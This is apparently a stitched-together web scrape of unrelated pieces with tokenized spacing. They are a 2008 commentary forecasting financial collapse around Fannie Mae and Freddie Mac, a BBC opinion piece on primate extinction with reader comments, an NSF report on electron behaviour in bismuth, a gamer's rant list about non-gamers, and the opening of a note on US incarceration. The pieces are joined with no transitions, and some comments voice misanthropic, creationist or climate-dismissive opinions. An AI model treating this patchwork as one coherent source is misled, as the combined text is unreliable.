" The sharpest 13 - week contraction in bank credit ” since data were first available in 1973 .
Banks simply do n't have the capital on hand to avail “ themselves of the cheap credit the Fed is offering to fund them at . ” .... This is what it means to be in a “ credit crunch . ”
Banks have suffered hundreds of billions in losses , forcing them to pull credit out of the economy .
Every time you read an article about banks cutting credit lines , exiting lending businesses , or eliminating mortgage products it represents more bank credit drying up . "
( Option Armageddon , " Understanding Bernanke " )
Bank credit is drying up because the capital is being destroyed ( from foreclosures and downgraded assets ) faster than anytime in history .
We are just now feeling the first stiff breezes from a Force - 5 deflationary hurricane set to touch down in 2009 .
Fannie and Freddie are teetering towards insolvency while the country is entering the most vicious downward cycle since the Great Depression .
Higher interest rates , negative home equity , mounting credit card debt , auto loan debt , commercial real estate debt and tightening lending standards will only curtail consumer spending more putting greater pressure on the dollar .
The Fed will have to be selective ; not everything can be saved .
Significant parts of the financial system will be reduced to ashes .
It would be wiser to clear the brush away from as many of the solvent institutions as possible and prepare for the worst .
Otherwise , the whole system is at risk of contagion .
Hundreds of local and regional banks are expected to go under .
( the average small bank has 67 % of its assets in real estate )
It can't be avoided .
They are holding too much bad paper and no way to make up for the losses .
They 're following the same path as the 250 mortgage lenders that vaporised in the subprime meltdown .
They could n't be saved either .
The bigger investment banks are in trouble too .
That 's why the SEC has finally decided to act as a regulator and go after short - sellers :
" The Securities and Exchange Commission announced an emergency action aimed at reducing short - selling aimed at Wall Street brokerage firms , Fannie Mae and Freddie Mac , and will immediately begin considering new rules to extend new requirements to the rest of the market . "
The SEC never took an interest in naked shorting of stocks ( or commodities speculators ) while its fat - cat friends in the big brokerage houses were raking in billions .
Now that many of these same institutions , including Fannie Mae and Freddie Mac , are in the crosshairs , SEC chief Christopher Cox is rushing to their rescue .
It is utter duplicity , but it illustrates an important point ; the system is cannibalizing itself just like Karl Marx predicted over 100 years ago .
Unchecked greed is inevitably self - destructive .
A growing number of market analysts are beginning to notice the storm clouds forming on the horizon .
The Royal Bank of Scotland has advised clients to brace for a full - fledged crash in global stock and credit markets over the next three months .
The Bank of international Settlements ( BIS ) made a similarly ominous warning that the credit crisis could lead world economies into a crash on a scale not seen since the 1930s .
The bank suggests that government officials and market analysts have not fully grasped the financial turmoil that could result from the mortgage crisis and its effects of the global economic system .
The body points out that the Great Depression was not anticipated because people ignored the implicit danger of " complex credit instruments , a strong appetite for risk , rising levels of household debt and long - term imbalances in the world currency system . "
Ron Paul ( R - Texas ) is one of the few members of congress who has shown that he has a grasp of the impending economic disaster now facing the country if corrective action is not taken swiftly .
In a speech he gave last week on the floor of the House , he said :
" There are reasons to believe this coming crisis is different and bigger than the world has ever experienced ...
The financial crisis , still in its early stages , is apparent to everyone : gasoline prices over $ 4 a gallon ; skyrocketing education and medical - care costs ; the collapse of the housing bubble ; the bursting of the NASDAQ bubble ; stock markets plunging ; unemployment rising ; , massive underemployment ; excessive government debt ; and unmanageable personal debt .
Little doubt exists as to whether we 'll get stagflation .
The question that will soon be asked is :
When will the stagflation become an inflationary depression ? "
The troubles at Fannie and Freddie are symptomatic of more deeply rooted problems related to abusive lending and the unsustainable expansion of credit .
We 've now reached our debt limit and the bills must be repaid or written off .
The Bush administration is hoping to reflate the bubble by ( stealthily ) recapitalizing the GSEs , but it wo n't be easy .
As one blogger put it , we have reached " peak credit " and have nowhere to go except down .
Economist Michael Hudson summed it up like this :
" The reality is that Fannie , Freddie and the FHA gave a patina of confidence to irresponsible lending and outright fraud .
This confidence game led them to guarantee some $ 5.3 trillion of mortgages , and to keep $ 1.6 trillion more on their own books to back the bonds they issued to institutional investors . "
It was a scam of Biblical proportions and now it is all starting to unravel .
Bush 's " ownership society " was a cheap parlor trick engineered by the Fed 's low interest rates to trigger massive speculation and shift wealth from one class to another .
Now , the housing bubble has crashed and the excruciating reality of insolvency is beginning to sink in .
Michael Hudson , again :
" All one hears is a barrage of claims that the government must preserve the financial fictions of Fanny Mae and Freddie Mac in order to ' save the market . '
The usual hypocrisy is being brought to bear claiming that all this is necessary to ' save the middle class , ' even as what is being saved are its debts , not its assets ... The “ way of life ” that is being saved is not that of home ownership , but debt peonage to support the concentration of wealth at the top of the economic pyramid .
Mortgages are the major debts of most American families .
In this role , real estate debt has become the basis for the commercial banking system , and hence the basis for the wealthiest 10 percent of the population who hold the bottom 90 percent in debt .
That is what Fannie Mae , Freddie Mac and “ the market ” are all about . "
( Michael Hudson ; " Why the Bail Out of Fannie Mae and Freddie Mac is Bad Economic Policy " , counterpunch.org )
The housing boom never had anything to do with Bush 's Utopian - sounding " ownership society " .
It was always just a swindle to enrich the banking establishment and divert middle class wealth to ruling class elites .

25 Jul 08 , 11:40 US Banking Scam
does anyone here know WHY exactly fnm and fre came to underwrite so many mortgages ?
its not because they are some sort of predatory enterprises in the world of finance ... its because the banks who are predatory got out of mortgage lending .
when times were more solid , fnm and fre had but a sliver of the underwriting business .
were it not for their move to take on more mortgage underwriting , all of you waiting for doomsday to get dirt - cheap housing would be faced with the prospect of 15 % fixed mortgages instead of 8 % . fnm and fre are major league scams for the shareholders and execs .
that is not in dispute .
they need more rules , rules that have teeth .
BUT , they were founded for a reason .
VIEWPOINT
Russell Mittermeier
The IUCN Red List of primates makes grim reading , says Conservation International president Russell Mittermeier .
In this week 's Green Room , he says the sooner we listen to the message that our closest living relatives are telling us , the longer we have to save ourselves .
Bonobo chimps , like Kanzi , face an uncertain future
If these highly intelligent species are dying out , what does that mean for us , their human cousins ?
Primates ' face extinction crisis ' Monkeys and apes are trying to tell us something .
After all , some of the non-human primates that share 98.5 % of our genetic code can and do talk to us .
Take Kanzi , for instance ; this bonobo chimp understands thousands of words , uses sentences , expresses emotions and concern for others ; even talks on the phone .
Whether certain primates , such as chimps and other apes , use language the same way people do remains a matter of scientific debate .
But one thing about primates that scientists agree upon today is that they are among the most threatened animal species on Earth .
Results of the most recent global primate assessment have been discussed this week at the annual International Primatological Society meeting , held in Edinburgh , Scotland .
The survey was done as part of the International Union for Conservation of Nature 's 2008 IUCN Red List of Threatened Species , and it is grim reading .
Nearly 50 % of the world 's 634 primate species and subspecies are in danger of going extinct .
The situation is most dire in Asia , where more than 70 % could disappear forever in the near future .
News reports of a global species extinction crisis appear every now and then .
Somehow , the fact that hundreds and perhaps even thousands of species are lost daily - gone forever , irreplaceable - has not roused much alarm among the general public .
Why it matters
Will it matter when the chimps , lemurs , gorillas and cotton - topped tamarins are all gone ?
After all , what has a monkey done for you lately ?
The yellow cheeked crested gibbon is listed as Endangered
Right now , the message monkeys are sending could help us all have a healthier , more secure and prosperous planet .
If these highly intelligent species are dying out , what does that mean for us , their human cousins ?
It means we have so seriously and destructively altered the Earth 's landscape that these creatures can no longer survive in their natural habitats .
We 've laid waste to forests from Latin America to Asia and Africa where these primates have lived and evolved , and where they are now perishing .
The larger , global impact of this kind of massive forest destruction equals one of the greatest causes of global climate change - which finally has captured the public 's attention and is causing alarm .
Twenty percent of greenhouse gas emissions that are accelerating global warming come from tropical forest destruction .
In fact , deforestation makes Indonesia ( one of the world 's three richest countries for primates ) the third leading emitter of greenhouse gases .
Shrinking world Habitat loss is the most serious threat to primates , closely followed by relentless hunting of some species to supply a luxury exotic meat market and for use in traditional medicines .
If primates are telling us to rescue them , they are also sending us a message that will help us rescue ourselves
In fact , in some places primates are literally being eaten to extinction .
It is horrific to see these animals in the open air bush meat markets , being grilled on fire pits and sometimes even being blowtorched to remove their hair , their faces frozen in final screams of anguish .
Forests where primates have historically occurred rely on these keystone species to remain healthy , productive ecosystems .
Many monkeys and apes eat the forest fruit and are the primary seed dispersers .
A forest that loses its primates becomes a forest without seedlings , unable to regenerate and thrive .
That in turn has a direct impact on people who live in or near these forests and rely on the forest resources for many essential needs .
There is plenty at stake for the entire planet if primates become extinct .
And that 's not to mention our undeniable affection for these intelligent , fascinating creatures .
We can see , and hear , ourselves in them .
Mountain gorillas have been caught in the crossfire of a land dispute
Diary : DR Congo gorilla rangers Kanzi and his sister Panbanisha , both born at a university research centre and raised by researchers , now live at Great Ape Trust in Des Moines , Iowa .
In the Democratic Republic of the Congo , where they would be found naturally , bonobos are increasingly threatened , largely due to habitat loss and hunting .
An increase in targeted local and international conservation efforts will be essential to help primates make it through this extinction crisis .
We must help developing nations where many of these primates live identify economic development alternatives that will conserve , rather than destroy forests .
Local people must be consulted and actively involved in finding the solutions that work for them and provide immediate and essential needs for their families .
If primates are telling us to rescue them , they are also sending us a message that will help us rescue ourselves .
Russell A. Mittermeier is president of Conservation International and chairman of global conservation group IUCN 's Species Survival Commission 's Primate Specialist Group The Green Room is a series of opinion articles on environmental topics running weekly on the BBC News website Do you agree with Russell Mittermeier ?
Are we failing to heed the warning of declining primate populations ?
Is the world destroying their habitats and eating them to extinction ?
Does it really matter if humans ' closest living relatives disappear from the face of the Earth ?
We have to make sure that we protect our environment in order to make sure that they survive
prudence lugendo , Dar es salaam / Tanzania
We 've become a cancer on the planet .
Our whole system is designed to consume and consume .
Population needs to be controlled to give room for everything else .
We would do that to any other species if it got out of control and we end up losing so much when these and other species are gone .
It does n't say much about humanity and we 're supposed to be the intelligent ones .
Jim , Sydney , Australia
As a species we are completely out of balance with nature .
Our ' needs ' seem to override any other considerations .
I really believe that one thing we need to do as a species is something to address our population growth .
All the time the human population continues to grow at the rate it is , I really can't see how much can change .
But , in the long run , I do believe that nature will resolve this problem .
Steve , Faversham , England Journalists and newspapers ( BBC included ) have been nothing but remiss in misrepresenting " news " .
We are bombarded with " news " everyday but what we actually need to know is relegated to the not - so - important pages .
When are these articles going to be front page ??
Thats what I want to know ...
Kelly M , New Zealand
Just another example of mankind 's complete stupidity .
When is the human race going to realise that the sole cause of all its problems is one of mass overpopulation and " head in the sand greed " .
One thing is for certain , we are heading for mass extinction faster ( and along with ) millions of other species on this planet .
We are a disgrace
Andy Morphet , Cheshire , England
Thank you for bringing awareness to those too busy to have time to think about such serious issues .
Our planet is precious and so are all living things on mother earth .
Blessings to those out their fighting for the survival of all things big and small !
Jacqueline Syverson , Seattle , Wa. USA
Whoever named our species Homo Sapiens ?
Stupidens would be more appropriate .
Skeptic , Bognor Regis
This is a disaster of the first order , one of many , and is a consequence of a wider human malaise : the inability of human social structures in the large to do anything constructive whatever about strategically important matters --- those that are not to do with interactions with other social structures --- until those strategically important matters become tactically urgent in the most obvious way .
Even then the amount of action taken seems to depend only upon the immediate physical impact upon people .
The text " After all , what has a monkey done for you lately ? " in the article is written in implicit recognition of this state of affairs .
In this light I can give odds - on that we will lose most primate species .
If we can store DNA and other biological samples theoretically sufficient to resurrect them , then that at least offers the possibility of some sort of future recovery if all else fails .
Carl , Minneapolis , MN USA
Somehow news like this upsets me more than the usual murder / war / corruption headlines that we are all so used to .
We are the most destructive force on this planet , and are slowly driving ourselves and every other species towards complete and total extinction .
We as a species need to admit our ignorance and get over our petty differences and greed , for too long have we been stagnantly stuck in a perpetual state of adolesence .
All of our actions have consequences and we are all dependent on this planet that we live .
Our Mother Earth is terminally ill and instead of protecting it , we are the cancer
Stephen Dooley , Belfast , Antrim Northern Ireland
We are ' humanists ' :
We have the right to have as many children as we like and cover the world like a plague .
It 's not animal habitat ; it 's a greenfield site for exploitation and development .
How dare you people start caring about animals ?
Oliver , Reading , UK Man is an ignorant over greedy primate who has lost site of how to live with nature .
Man thinks civilisation is a process of monetary exchange and commerce .
Man will cause his own extinction sooner than he knows , and he will be ignorant of the fact , too busy making money , until its too late .
Kevin , Raleigh , NC , USA ( Previously Oxford UK )
We should be clear why the primates are under threat of extinction .
It is nothing to do with ' Climate change ' , it is because their habitat is being destroyed due among other reasons to the response to the ' threat of global warming ' .
By cutting down old growth forest ( which does not soak up additional carbon ) to plant new plantations to take advantage of the absurd Carbon trading schemes or for growing biofuel crops , habit is being destroyed .
As stated in the article , any help that the developed world give to the developing world should encourage the conservation of forest 's not their destruction as seems to be the case at present .
Hugh Scott , Ballyclare
The human population simply must find a way to live sustainably with the rest of the life on the planet .
The great challenge now , it seems , is there are so many people , all with needs , and so many living in poverty .
They wo n't put a primate before themselves .
And they also are n't online reading about the world 's problems .
Many probably believe primates are plentiful and fine , until they find no more to hunt .
In the last 50 years the human population has exploded and just about all other species have declined or even disappeared .
About 300 - 500 tigers remain in the wild .
7,000,000,000 people and 300 tigers .
Clearly the weight is on us to save these and other species in this generation .
We need worldwide , cooperative laws and enforcement to do so .
Countries work together to feed people of the world .
They must now work together to save what remains of natural ecosystems -- including the oceans , where 90 % of large fish are gone , fished away by airplane spotters and caught in e!
normous nets that wipe out whole schools , something you can watch on fishing channels as if it 's great sport .
The time to act and work together has come , worldwide .

How do you get across to this world 's political leaderships who have no credentials except a pin-striped suit and a total ignorance of the planet that reality is something they had better get to grips with ; and , begin to take advise from those more educated , and knowledgeable than themselves .
Robert Sinclair Shand , Wick
This is the result of greed .
Whilst we wring our hands in despair we shout that we pay too much tax !
We amass more wealth than we need , competing with each other so that we can lead more oppulent lifestyles , regardless of the consequences .
If we do n't even care about each other it's not likely we 're going to care for animals is it ?
Capitalism just does n't work , we need to move to a system where the needs of the many , and of our world , is not outweighed by the greed of the few .
John Rampton , Poole , UK I am pessimatic about the future of primates .
Habitat destruction in most Asian countries poses increasing threat to primates .
Unstainable logging for timbers and clearing forests for urban development are driving primates to the verge of extinction .
The policy of maximizing economic growth even at the expense of huge environmental cost is not uncommon in most developing countries .
They admire the success of China 's econmic reform and adopt ' Devlopment first , treatment later ' model .
The culture of eating wild animals still prevails in some Asian countries .
Education is the only way of averting this uncivilized practice but it may take generations to work .
The question is can these lovely creatures struggle for that long before the become extinct ?
Ho Kin Wa , Hong Kong
Than you for this enlightening news , it is 100 % true that people are responsible for the decline of our cousins , it is high time the world should have some sense of humanity and rescue the primates just like the efforts Jane Goodall who set up chimp sanctuary at olpejeta conservancy in Kenya .
Noelolweny , Kisumu , kenya Re Louise Proulx 's comments , i totally agree .
It breaks my heart to read articles like this but just makes me more determined that i will make a difference , as much as i can .
However i have no comprehension of what it is like to live in Asia , for example .
Do they even know what impact they are having on our environment and other species who should be SHARING our earth ?
Perhaps mass educational reform on such issues is needed ?
Ali , UK Political correctness will kill us all .
Everybody knows the only answer to this problem , but nobody talks about it .
All we have to do to kill animal life ( and finally ourselves ) is to continue to mutiply .
Loss of habitat is the main monkey killer , is it not ?
But people destroy forests not for sport or pleasure , they have to survive .
So there you go , either rigid population control or ...
But how many of you out there are willing to give up their right to have as many children as they like ?
Taly Kin , Rostov ; Russia
There is much that is both correct and important in this article .
What a pity then that the nonsense about CO2 causing global warming had to be brought into it .
I fear that some of the good work which environmentalists do and real potential catastrophies which they warn about will be discredted when the global warming scam is finally exposed .
Mike Owens , York
We just have to wait our turn to extinct ...
Soon or later ...
Hartono , Jakarta , Indonesia
My heart sinks to hear this news .
A rational course to protect our planet 's climate and our livelihood would be to protect forests from further deforestation .
The politics of this world will consume it all .
I agree with Russell Mittermeier and hope citizens of the world unite before it is all history .
William Evans , Las Vegas , Nevada , USA
The disappearing primate problem is more than people torturing monkeys or cutting down trees because they are too stupid to understand how beneficial forests are to the earth as an ecosystem .
Just about every species of primate is found in a developing nation , amongst people who do not have the luxury of nascar / air - travel / meat diets .
If your survival was dependent on money from bush meat or lumber , you would have a much different opinion about the whole situation .
Why do n't we look at the grim prospects for primates as a call to alleviate world wide poverty .
The only people who need to wake up are people exactly like me who are sitting at their computers - over privileged , and wiling to share their opinions , but not their time to help slow the degradation of the quality of life around the world .
Holly Krohn , United States Cause and effect of a burgeoning human population , usualy in areas of low resources , and its ever growing effect on Primates and the rest of Nature seems a taboo subject .
Its fine for the West to limit by abortion , to take the blame for Climate Change .
But not fashionable to ask the Third World to limit its family numbers .
Eric Brown , Newport .
Wales Human beings have brought nothing but pain greed and destruction to this planet .
The sooner homo - sapiens become extinct the better the chances of survival for earth and its remaining species .
nick spry , Penzance
In my opinion humans have been so scared , divided , brainwashed into inaction and to act as individuals that feel powerless to act that things get neglected .
Until the human race is educated into realizing that all humans , animals , ecosystems are all interconected for the best of all life and our planet all these tragic episodes will just seem as a seperate detatched issue that has less importance than its real seriousness .
Adrian Moffat , Besançon France
Hey wake up !
We are not decended from apes .
If they are 98.5 % simililar how did they change " overtime into humans " ?
Why are they not changing right now ?
It amazes me that learned people still believe in this tuf .
It is so much common sense that that God created it all with intellignet design .
Not morphing .
He also had man take " dominion " over the earth .
Some times that is good sometimes bad .
Ken , Colbert , WA USA Louise Proulx wrote : " How people can torture these poor creatures like they have no brain , no nerve - endings , no feeling , is beyond me .
How can people think that if we wipe out these creatures , that us humans and our planet , will be " just fine " , leaves me speechless . "
We should hardly be surprised that this travesty is occurring .
We have , and I do n't know any other way to put it , created a pervasive culture of death that seems hell bent on destroying everything that gets in the way of fulfilling the selfish desires of a particular group of people who otherwise consider themselves responsible and enlightened .
Our closest primate cousins are suffering in slow motion the same fate that befalls millions of tiny human beings - unseen , unwanted , and inconvenient .
As Mother Teresa lamented years ago , " If a mother can kill the child in her own womb , what is left of the West to save ? "
What , indeed ?
Victor Panlilio , Calgary , Alberta , Canada
It is utterly horrific .
The comment , " After all , what has a monkey done for you lately ? " makes a telling point .
This is precisely the attitude of many people .
They see things only in terms of themselves , ie what use is it ?
But animals have a right to life totally independent of their utility .
If there were no humans on Earth ( not such a bad idea ) animals would still have an importance in and of themselves .
I am not a religious person but I would like to see religious authorities , all of them , take a moral lead by instructing their flocks and pointing out that such behaviour is , literally , sinful and not pleasing to God .
I also encourage celebrities and anyone with influence to do the same .
Whatever works .
The behaviour and attitudes described in this article are vile .
Completely evil .
Ricardo Cabeza , Santiago , Chile
Its really very simple folks .
You want a nice air conditioned home , cars to drive around with , food grown specially for you and hauled to your supermarket , it all cots money .
The more money you have the better the quality of your life .
If you have logging contracts from your government , drilling rights for oil , a monopoly on medical care and supplies or gasoline distribution , you make a lot of money .
You , your wife and children enjoy the good life .
Now are you going to gve it all up because monkeys and gorillas in the jungles are threatened with extinction ?
Do n't make me laugh !
RFM , Deerfield , USA
This has been going on for some time , but it seems that the pace of destruction is now starting to be noticed by a wider audience .
I am deeply saddened by some of the species reports prepared by IUCN , such as of the Hainan Gibbon , and I am sure may people do really care .
Sadly , the people who exercise the most power over what happens to the forests ( ie. government officials , businessmen and corporations ) are probably little interested .
Perhaps the best we can hope is for conservation organisations to buy large blocks of forest , or to continue lobbying governments and work with them to establish more reserves .
panthera_tigris , Middlesex
Thank you for providing this information .
I guess awareness is the first step to making changes .
What is the conservation plan and who is responsible for it ?
How can people contribute to preventing the consequences to our shortsightedness ?
How can we spread this information enough that we move on to the phase of action and begin to make a difference ?
Maria Pelova , Yellowknife , NT , Canada
Though the news is terrible indeed , I 'm delighted and encouraged that so many people are taking interest in efforts to help .
If you want to help , get involved with or donate to groups like the Bonobo Conservation Initiative or the Wildlife Conservation Society .
We can and must do better .
Mark Relyea , Hartford , CT I do n't know what all the fuss is about ?
Let Evolution takes its course .
The experts keep telling us that man is merely another animal , so let us [ man ] continue to evolve , and do it by being the fittest and the strongest , and if , it means the weaker " apes " have to die - out so we can evolove into being better animals , so be it !
paul. , Bolton
This is a mess , it has been for the last fifty years .
When there are birds who mimic the sound made by chainsaws you know you are drinking at the last chance saloon .
Frankly and excusing the pun I do not give a monkeys about humankind .
We are a blight upon this planet , an imbalance of nature .
I often read comments on web pages replying to views such as the one I express .
Comments that ask if animals are more important than human progress .
The answer remains the same from me , animal species are more important , they are still in the majority and have a track record of not mining the planets resources to make junk that is soon discarded into holes in the ground or burnt .
The sooner we fail the better for the planet and its remaining species , we are like a virus here .
Ian , Manchester , England A declining primate population is a very serious indicator that human society is destroying the very ecosystem that all life on Earth needs to survive .
So , yes , it does matter if these primate cousins are wiped out .
As Russell points out , they are part of an interconnected web of life that will be unravelled very quickly if the balance point is tipped too far .
We are tipping that balance point , and the reason for this is that we have distanced ourselves , disconnected if you will , from the life systems that sustain us .
As a group we therefore have no concept of maintaining the balance by allowing an ecosystem to replenish itself ; we simply strip it bare .
So - called primitive cultures , such as the Native Americans , were aware of this need for balance , because it was in their own interest to preserve the living systems around them .
It is in our interest too .
Liz Elliott , Woking , UK Human beings have never hesitated to kill members of our own primate species in war , violence , genocide , murder , or any other such activity .
Why would anyone expect us to spare any other species of primate ?
Greg , Washington , DC
We are the shame of the animal kingdom .
My hopes for a " soft landing " as we move toward sustainability are grim .
We 'll be lucky ( maybe clever ) if we avoid run away greenhouse feedback ( methane sea ice , tundra melt , ice to open water ) and kill most everything .
But the species lost looks , today , undefendable .
The latest great extinction is upon us and nascar / costco / air - travel / meat - diet are all time favorites .
So we keep trying .
Thanks for your conservation efforts and press coverage .
We 're farming in San Luis Obispo ( Food not Lawns ) at households and riding our bikes .
Our little part .
Greg Junell , San Luis Obispo CA USA
Humans use primates for medical testing because they are extremely similar to us genetically .
If we are degrading the Earth 's life support systems to the extent that our genetic cousins are dying " en mass " then it should be obvious that our species ' days are numbered too .
Politicians must wake up and act now - Brown / Cameron / Miliband , who cares ?
- Everyone , just do something to prevent this catastrophe now !
Leyton Williams - Davies , Pontypool , Wales , UK I agree wholeheartedly on this issue .
We are n't taking care of anything and most of the human race turns a blind eye or is just inherently ignorant .
Its lamentable that we do n't do anything for anyone except care about our existance , and even then we do n't do a great job of that either .
Andrew , Denver , CO USA
This news , is earth - shattering .
How people can torture these poor creatures like they have no brain , no nerve - endings , no feeling , is beyond me .
How can people think that if we wipe out these creatures , that us humans and our planet , will be " just fine " , leaves me speechless .
I just want to help - and I want the humans of this earth to wake up .
I feel sick to hear such horrible news .
Thank you for putting this out there - I hope it makes everyone wake up and take positive action to save our primates .

A team of researchers at Princeton University 's Materials Research Science and Engineering Center has observed electrons moving through a crystal of bismuth metal behaving like light .
This discovery , supported by the National Science Foundation ( NSF ) and detailed in today 's edition of the journal Science , could lead to new kinds of electronic devices .
Electrons , or the particles of electricity , fly through space like tiny baseballs .
Alternatively , when an electron speeds between a crystal 's periodic arrangement of atoms it behaves very differently .
The fundamental equations that describe its motion in the crystal are very different from those of a free - flying baseball .
For example , in bismuth , the fundamental equations of electron motion resemble those that describe the behavior of light .
Although the electrons whirl about the crystal slower than at the speed of light , the electrons behave as if they are without mass like photons , the tiniest unit of light .
Over a decade ago , theoretical physicists supported by NSF studied electrons confined to artificial layered structures made of semiconductors -- the stuff of which transistors are made of .
They predicted that new kinds of electronic matter governed by the rules of quantum mechanics would emerge from the electrons in different layers coordinating their motions .
Scientists hypothesized that bismuth crystals should also exhibit analogous electronic states .
The Princeton group , led by physics professor N. Phuan Ong , fixed a crystal of bismuth onto a flexing beam , or cantilever , and then placed this apparatus in a high magnetic field created at the NSF National High Magnetic Field Laboratory , which can generate magnetic fields that are more than a million times stronger than the earth 's faint magnetic field .
Under such enormous magnetic fields , the cantilever twists .
The way it twists tells the Princeton researchers about the subtle new kind of matter in the bismuth crystal .
In a single crystal of bismuth , electrons are often confined to three valleys in a complex abstract landscape that scientists use to represent an electron 's energy in the crystalline structure .
Through careful study of the twisting cantilever , they observed a transformation from a state where the electrons prefer to occupy only one valley to a state in which the electrons share their time among all the valleys in a dance choreographed by the fundamental rules of quantum mechanics .
" This is exciting because this was predicted but never shown before , and it may eventually lead to new paradigms in computing and electronics , " said Thomas Rieker , NSF program director for materials research center .
With this work , the theory of electrodynamics suggests a rich landscape of electronic states of semiconductors , and the Princeton researchers are continuing their adventure .
Someday , these newly discovered electronic states of matter may enable powerful new electronic devices that exploit the principles of quantum mechanics to compute and communicate .
For now we can marvel at the subtle beauty of nature that lives in a universe of electrons that lies beneath the shiny skin of a metal crystal .
Now , with those same people snatching up Wiis , fumbling through Guitar Hero and pretending to finally " get " our hobby , it 's time to turn the tables .
What annoys you about non-gamers ?
When they talk about gaming , what inane and ignorant comments irritate you the most ?
When they watch you play , what reactions and suggestions piss you off ?
And worst , when they actually attempt to " join in the fun , " what rookie mistakes and head - shaking blunders make you want to scream ?
Here 's our list of grievances .
Share yours .
# 1 You can't have it both ways .
Parents , politicians and pundits are constantly scolding kids for spending too much time with videogames .
At the same time , however , they casually mock anyone who dares play as an adult .
Which age group is being irresponsible again ?
Make up your damn minds !
# 2 Look who 's talking .
If you spend most days building kitten orphanages andserving hot soup to homeless rainbows , then yes , you can tell us that gaming is " a waste of time . "
If you sit on the couch instead - watching sports , voting for reality television or browsing celebrity gossip blogs - then please shut your hypocritical mouth .
# 3 Control yourself .
That game pad is not a rock and you are not an angry gorilla .
Smashing the buttons with all your ferocious might is not going to make your character any faster , stronger or smarter .
It will probably break our $ 50 piece of equipment , however , so just stop .
# 4 Yes , this stuff is expensive .
If we ask you to put on the wrist strap , to take astep back from the HDTV , to wash your greasy Cheeto - caked mitts or to grab " the guest controller , " we have every right .
Do n't act offended and do n't look at us like we 're anal retentive freaks .
# 5 It 's your fault .
Not the game's .
Not the controller's .
Not the connection's .
Not the lighting 's .
Yours .
# 6 Quit quoting us out of context .
No matter how many times you repeat the line for the amusement of our friends and family , " Can you help me level my paladin tonight ? " still made perfect sense within the framework and rules of the game .
Seriously !
# 7 " Hello 3 " for the Sony Wii does not exist .
It will never exist .
When we patiently try to explain this to you , please do n't blame us for your mixed information .
Gamers have not organized themselves into a secret , worldwide conspiracy merely to keep the best titles away from you .
Maybe you 're just wrong .
# 8 Shush !
If you do n't like people talking during movies , walking in front of the television screen or singing over your favorite songs , then - for the love of God - do n't interrupt us during a game 's cutscene .
The alien , the dragon and the talking spellbook were having a very important conversation ...
# 9 " Hey , are you winning ? ! "
Umm , this is an RPG with hundreds of quests and paths over dozens of hours , so it 's really hard to s- ... " Cool !
How many points you got ? "
Sigh .
# 10 If you suck , admit you suck .
Give up the guitar .
Step away from the drums .
Let someone else join the race or fight .
You had your chance and you had your fun .
At this point , you 're spoiling the fun for the entire party .
Know when to walkaway with at least a shred of dignity and goodwill intact .
# 11 Dur dur dur dur dur .
Oh yeah , bumping into us in the middle of a competitive match is hilarious .
Reaching over and messing with our controller is effing hysterical .
Dying or crashing on purpose is the funniest thing ever .
Now go play with your blocks and let the grown ups enjoy their real game .
# 12 Time out .
Oops !
Your fat fingers have done it again .
They 've " accidentally " paused the game , or hit the dashboard button , at the very moment you were about to lose .
Funny , that .
# 13 Please do n't patronize .
Do n't ask us what we 're playing and what 's going on in the game unless you actually want to know .
Complete disregard would be preferable to your barely veiled expression of disinterest and disdain .
# 14 No , this is n't " that Mario game . "
Every game ever made is not called Mario .
Ditto for Pac - Man , Tetris , Doom , Myst and Pong .
We have not been playing the same thing for 25 years .
Similarly , Gears of War is not Halo " with new guns " and SoulCalibur is not Street Fighter " with different graphics . "
# 15 No , his name is n't " Zelda . "
It 's Link .
Samus is n't " Metroid " and Pikachu is n't " Pokemon . "
Sometimes videogames - like books , films and television - are complex enough to contain characters with namesseparate from the title .
Hard to believe , but true !
# 16 Scared stupid .
If you 're going to scream and run away each time an enemy fires a gun , swings a punch or makes the slightest noise , perhaps you should sample a hobby other than videogames .
Quilting is quite rewarding , we hear .
# 17 " Well , that 's a great thing to teach children ... "
How observant of you !
Yes , these severed limbs , crushed skulls and buckets of exploding blood are quite gory .
Good thing the game is rated Mature and can't be sold to minors , right ?
Right ?
# 18 Do the research .
Yes , games are full of foul language , awfulviolence , crude sexuality andotherinappropriately mature situations .
Protest all you like , but at least protest theright offenders for the right reasons .
A single e-mail or phone call could have told the mainstream media that Mass Effect was not a sex simulator .
Why is ignorance so acceptable on this one particular subject ?
# 19 Save !
We 're tired of watching you start your Sim family , your Animal Crossing town and your Viva Pinata garden from scratch - again .
We know you just want to run around punching people in GTA , but maybe if you saved , you could eventually run around and punch people on a totally new island .
How does that sound , hmm ?
Oh , and while we 're on the subject ...
# 20 Hold the eff on .
Whatever you want from us , we can't do anything until we save .
No , really .
No , nothing .
You want to lose the last 45 minutes of your life , too ?
Then deal with it .
# 21 Learn your shit .
Some ignorance is understandable , of course - we 're all beginners at some point .
If you can't muster enough patience to sit through a five minute tutorial , however , do n't whine when you forget the controls .
Do n't bitch and complain when you end up interacting with a clearly non-interactive crate instead of the glowing , obviously interactive computer right next to it .
And exactly how many times do we have to remind you which screen is yours in a multiplayer match before you memorize that simple , binary piece of information ?
This is n't calculus , genius .
# 22 Games are n't THAT immersive .
If you could refrain from physically ducking , dodging , bobbing and weaving every single time a bullet is fired or a vehicle drives past the screen , you might look like less of a mental patient and , therefore , we might be willing to sit next to you again .
Rest assured that when the Holodeck is finally invented , you can flop and flounce around as much as your heart desires .
# 23 Look up , damn you , look up !
There are no enemies on the floor .
There are no doors on the floor .
There is no nothing on the floor .
So why does every non -gamer spend every minute of every FPS zigzagging drunkenly into obstacles while staring , dumb and confused , at every pixel of every floor ?
Frustrating .
Nauseating .
# 24 Do n't be a cheap ass .
By purchasing the crap giftfor $ 20 instead of the quality giftfor $ 60 , you 're just encouraging developers to produce extra bargain bin titles , usually worth less than 20 cents , instead of devoting their time and funds to more potential masterpieces .
When your loved ones tell you what they want , listen .
They know what they 're talking about .
# 25 Do n't be an enabler .
By purchasing licensed dreck ( and the shitty sequels to licensed dreck ) simply because you recognize the celebrity on the front of the box , you 're pulling down the entire industry .
Enter the Matrix sells millions while Okami sells thousands .
Space Chimps and Van Helsing get multi-platform releases , while Psychonauts is denied a sequel .
We all suffer because of your poorly informed taste .
Buy good games or do n't buy games at all .
PLEASE .
Got something else to complain about ?
Rant away .

The mammoth increase in the United States ' prison population since the 1970s is having profound demographic consequences that disproportionately affect black males .
" This jump in incarceration rates represents a massive intervention in American families at a time when the federal government was making claims that it was less involved in their lives , " according to a University of Washington researcher who will present findings Sunday ( Aug. 3 ) at the annual meeting of the American Sociological Association .
